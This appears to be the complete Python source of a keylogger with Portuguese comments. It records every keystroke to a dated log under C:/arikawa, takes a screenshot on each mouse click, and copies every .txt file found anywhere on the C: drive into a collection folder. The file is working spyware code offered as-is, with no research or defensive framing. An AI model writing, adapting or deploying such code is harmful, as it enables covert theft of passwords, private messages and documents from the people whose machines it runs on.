from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py
import shutil

# Criar a pasta no disco C
c_drive = "C:/"
pasta_arikawa = os.path.join(c_drive, "arikawa")

try:
    os.makedirs(pasta_arikawa, exist_ok=True)
except Exception as e:
    print(f"Erro ao criar pasta 'arikawa': {e}")

def on_press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.tab', '\t', tecla)
    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    dataAtual = datetime.now()
    data = dataAtual.strftime("%d-%m")
    diretorioRaiz = os.path.join(pasta_arikawa, "keylogger_" + data)
    arquivoLog = os.path.join(diretorioRaiz, "keylogger.log")

    with open(arquivoLog, 'a') as log:
        if str(tecla) == str("apagar"):
            if os.stat(arquivoLog).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0, 2)
                caractere = log.tell()
                log.truncate(caractere - 1)
        else:
            log.write(tecla)


def on_click(x, y, buttom, pressed):
    if pressed:
        dataAtual = datetime.now()
        data = dataAtual.strftime("%d-%m")
        diretorioRaiz = os.path.join(pasta_arikawa, "keylogger_" + data)
        arquivoLog = os.path.join(diretorioRaiz, "keylogger.log")

        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".jpg"))

        for caminho, pastas, arquivos in os.walk('C:\\'):
            for arquivo in arquivos:
                if arquivo.endswith(".txt"):
                    shutil.copy(os.path.join(caminho, arquivo), pastaCopias)


dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")
diretorioRaiz = os.path.join(pasta_arikawa, "keylogger_" + data)
arquivoLog = os.path.join(diretorioRaiz, "keylogger.log")
pastaCopias = os.path.join(diretorioRaiz, "copias")

try:
    os.makedirs(diretorioRaiz, exist_ok=True)
except:
    pass

try:
    os.makedirs(pastaCopias, exist_ok=True)
except:
    pass

keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keyboardListener.start()
mouseListener.start()
keyboardListener.join()
mouseListener.join()